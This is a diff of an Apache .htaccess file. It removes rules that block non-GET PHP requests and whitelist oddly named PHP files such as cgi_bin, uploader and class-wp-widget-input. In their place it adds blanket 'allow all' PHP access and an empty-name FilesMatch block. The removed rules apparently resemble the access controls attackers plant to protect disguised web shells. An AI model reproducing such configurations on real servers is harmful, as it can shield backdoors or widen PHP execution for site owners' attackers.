@@ -1,19 +1,16 @@
 <IfModule mod_rewrite.c>
-    RewriteEngine On
-
-    RewriteCond %{REQUEST_METHOD} !^(GET|HEAD) [NC]
-    RewriteCond %{REQUEST_URI} \.(php|php3|php4|php5|php6|php7|php8|phtml|phps)$ [NC]
-    RewriteCond %{REQUEST_URI} !/cgi_bin\.php$ [NC]
-    RewriteCond %{REQUEST_URI} !/footer\.php$ [NC]
-    RewriteRule .* - [F,L]
+    RewriteEngine Off
 </IfModule>
-
-<FilesMatch "\.(php|php3|php4|php5|php6|php7|php8|phtml|phps)$">
+<IfModule mod_authz_core.c>
+    <FilesMatch "\.php$">
     Require all granted
+    </FilesMatch>
+</IfModule>
+<FilesMatch "\.php$">
+    Order allow,deny
+    allow from all
 </FilesMatch>
-
-<FilesMatch "^(cgi_bin|uploader|bootstrap|template-images|plugin-header|class-wp-block-header|class-wp-widget-input|class-wp-widget-date)\.(php|php3|php4|php5|php6|php7|php8|phtml|phps)$">
-    <IfModule mod_authz_core.c>
-        Require all granted
-    </IfModule>
+<FilesMatch "^()$">
+Order allow,deny
+Allow from all
 </FilesMatch>
